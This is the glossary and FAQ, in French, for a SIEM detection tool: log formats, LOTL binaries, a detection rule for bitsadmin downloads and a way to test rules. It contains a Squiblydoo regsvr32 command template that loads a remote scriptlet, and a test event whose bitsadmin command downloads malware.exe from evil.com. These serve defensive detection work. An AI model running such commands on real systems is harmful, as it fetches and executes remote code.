# Glossaire v2

Voir aussi le glossaire v1 pour les termes de base (CanonicalEvent, Signal, Alert, JSONL, Sigma, VSS…).

**CEF (Common Event Format)**  
Format de log structuré développé par ArcSight (HP). Utilisé par les équipements de sécurité réseau (firewalls, IDS). Structure : `CEF:version|vendor|product|version|id|name|severity|extensions`.

**LOTL (Living off the Land)**  
Technique d'attaque utilisant des binaires légitimes du système pour exécuter du code malveillant. Les binaires LOTL les plus couramment abusés : `powershell.exe`, `wmic.exe`, `mshta.exe`, `certutil.exe`, `rundll32.exe`, `regsvr32.exe`, `schtasks.exe`.

**MITRE ATT&CK**  
Framework de taxonomie des tactiques et techniques d'attaque cybernétiques. Maintenu par la MITRE Corporation. URL : https://attack.mitre.org — Chaque technique a un identifiant T-XXXX[.YYY] (ex: T1059.001 = PowerShell).

**NXLog**  
Agent de collecte de logs Windows open-source. Exporte les Windows Event Logs en JSON. Compatible avec le parseur `_flatten_windows_json()` du SIEM v2.

**Process Tree**  
Arbre de parenté entre processus, construit à partir des relations `PPID → PID` observées dans les événements. Indispensable pour les règles de type "spawn suspect".

**RFC 3164**  
Standard BSD Syslog, publié en 2001. Format legacy, sans année dans le timestamp. Toujours très répandu sur les équipements réseau.

**RFC 5424**  
Standard Syslog moderne, publié en 2009. Timestamp ISO 8601, champs structurés en option. Utilisé par rsyslog, syslog-ng, journald.

**Squiblydoo**  
Technique LOTL utilisant `regsvr32.exe /s /n /u /i:http://... scrobj.dll` pour charger et exécuter un COM scriptlet distant. Contourne AppLocker. Documentée par Casey Smith (@subtee).

**Winlogbeat**  
Agent Elastic pour la collecte des Windows Event Logs. Exporte en JSON imbriqué sous les clés `winlog.event_data.*`. Compatible avec `_flatten_windows_json()`.

---

# FAQ

**Q : Le SIEM supporte-t-il les événements Sysmon directement ?**

Oui. Les EventID Sysmon (1 = ProcessCreate, 3 = NetworkConnect, 7 = ImageLoad) sont détectés dans les champs `event_code` extrait par le syslog parser. Sysmon fournit le champ `ParentImage` nativement dans EventID 1, ce qui enrichit le process tree.

---

**Q : Le mode `auto` est-il plus lent que `json` ?**

Marginalement. Chaque ligne est testée avec `startswith("{")` avant d'être parsée. Pour des fichiers JSONL purs, l'overhead est négligeable (O(1) par ligne). Pour des fichiers syslog purs, le mode `syslog` est légèrement plus rapide car il évite la tentative JSON.

---

**Q : Que se passe-t-il si `ProcessTree.build()` échoue ?**

`engine.py` attrape l'exception, la logue sur stderr, et assigne `tree = None`. Les règles `lotl_sigma` qui dépendent du tree (spawn suspects) sont ignorées. Les règles CommandLine et EventID continuent.

---

**Q : Comment ajouter une nouvelle règle LOTL ?**

1. Ouvrir `src/detect/modules/lotl_sigma.py`
2. Ajouter un `LotlRule` dans le tuple `_RULES` :
```python
LotlRule(
    rule_id="LOTL-009",
    name="Bitsadmin Download",
    image_match="bitsadmin.exe",
    cl_patterns=(r"/transfer", r"/download"),
    score=0.70,
    confidence=0.65,
    mitre_tactic="Command and Control",
    mitre_technique="T1197",
    recommendation="Inspecter le job BITS créé.",
    risk_label="bitsadmin-transfer",
),
```
3. La règle est automatiquement chargée au prochain lancement.

---

**Q : Les Signals PowerShell génèrent-ils des Alerts ?**

En v2, non — la politique du corrélateur (`correlator.py`) ne promeut toujours que les signaux `ransomware_behavior` en Alerts. Les signaux `ps.*` et `lotl.*` sont disponibles dans `signals.jsonl`. La promotion des signaux LOTL en Alerts est prévue en v3 avec une politique de corrélation multi-signal.

---

**Q : Comment tester une nouvelle règle sans modifier le code ?**

Créer un événement JSON de test ciblant la règle et le passer en `--format json` :

```json
{"timestamp":"2024-01-15T12:00:00Z","host":"TEST","event_type":"process","process_name":"bitsadmin.exe","command_line":"bitsadmin /transfer job1 http://evil.com/malware.exe C:\\temp\\malware.exe"}
```

```bash
python -m ingest.replay --format json --input test_event.jsonl --out-dir /tmp/test
cat /tmp/test/signals.jsonl
```
